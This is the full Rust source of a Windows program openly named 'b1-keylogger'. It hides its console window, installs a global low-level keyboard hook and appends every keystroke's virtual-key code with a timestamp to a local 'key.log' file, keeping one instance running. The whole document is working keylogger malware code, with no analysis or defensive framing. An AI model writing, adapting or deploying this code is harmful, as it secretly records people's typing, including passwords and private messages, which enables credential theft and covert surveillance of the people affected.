#![windows_subsystem = "windows"]
extern crate chrono;
extern crate user32;
extern crate winapi;
extern crate single_instance;

use single_instance::SingleInstance;
use chrono::prelude::*;
use std::cell::RefCell;
use std::fs::File;
use std::fs::OpenOptions;
use std::io::prelude::*;
use std::io::Error;
use std::process;
use winapi::shared::minwindef::{BOOL, FALSE, TRUE};
use winapi::shared::windef::{HHOOK, HHOOK__};
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::winuser::GetMessageW;
use winapi::um::winuser::SetWindowsHookExA;
use winapi::um::winuser::{CallNextHookEx, KBDLLHOOKSTRUCT};
use winapi::um::winuser::{LPMSG, MSG};
const WH_KEYBOARD_LL: i32 = 13;
const WM_KEYDOWN: usize = 0x0100;

static mut hook_id: Option<HHOOK> = None;

fn main() {
    let instance = SingleInstance::new("b1-keylogger").unwrap();
    //assert!(instance.is_single());
    if !instance.is_single() {
        println!("Process is already running, exit...");
        process::exit(1);
    }
    unsafe {
        println!("before hook");

        hook_id = Some(SetWindowsHookExA(
            WH_KEYBOARD_LL,
            Some(hook_callback),
            std::ptr::null_mut(),
            0,
        ));

        //println!("hook_id{:?}", hook_id);
        // Don't forget to release the hook eventually
        //  user32::UnhookWindowsHookEx(hook_id);
        // let mut msg:MSG = MSG::new() ;
        use winapi::shared::minwindef::{DWORD, LPARAM, UINT, WPARAM};
        use winapi::shared::windef::{HWND, POINT};
        let mut msg = MSG {
            hwnd: 0 as HWND,
            message: 0 as UINT,
            wParam: 0 as WPARAM,
            lParam: 0 as LPARAM,
            time: 0 as DWORD,
            pt: POINT { x: 0, y: 0 },
        };
        while GetMessageW(&mut msg as LPMSG, std::ptr::null_mut(), 0, 0) != FALSE {}
    }
}

extern "system" fn hook_callback(code: i32, wParam: usize, lParam: isize) -> isize {
    if code >= 0 {
        if wParam == WM_KEYDOWN {
            let kbdStruct = unsafe { (*(lParam as *mut KBDLLHOOKSTRUCT)) as KBDLLHOOKSTRUCT };
            println!("{:?}", kbdStruct.vkCode);
            log_me(kbdStruct.vkCode);
        }
    }
    println!("hook id in hook_callback{:?}", unsafe { hook_id.unwrap() });
    let _res = unsafe { CallNextHookEx(hook_id.unwrap(), code, wParam as usize, lParam as isize) };
    return 0;
}

fn log_me(code: u32) {
    let mut file = OpenOptions::new()
        .write(true)
        .append(true)
        .open("key.log")
        .unwrap();
    let local: DateTime<Local> = Local::now();
    if let Err(e) = writeln!(file, "{:?} , {:?}", local, code) {
        eprintln!("Couldn't write to file: {}", e);
    }
}
